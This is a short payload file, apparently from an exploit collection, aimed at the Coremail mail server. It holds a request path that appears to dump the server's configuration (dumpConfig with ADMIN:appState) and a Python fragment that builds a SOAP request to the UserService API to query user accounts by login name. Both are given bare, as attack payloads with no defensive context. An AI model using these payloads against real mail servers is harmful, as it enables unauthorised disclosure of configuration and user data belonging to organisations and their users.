exploit/web/Mail/Coremail/payload.txt

mailsms/s?func=ADMIN:appState&dumpConfig=/

    url = url + "/apiws/services/UserService"
    post_data = ''' 
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:apiw="http://coremail.cn/apiws">     
        <soapenv:Header/>     
        <soapenv:Body>        
            <apiw:queryTheUser>         
            <!--type: string-->         
            <loginName>%s</loginName>        
            </apiw:queryTheUser>     
        </soapenv:Body>
    </soapenv:Envelope>    
    '''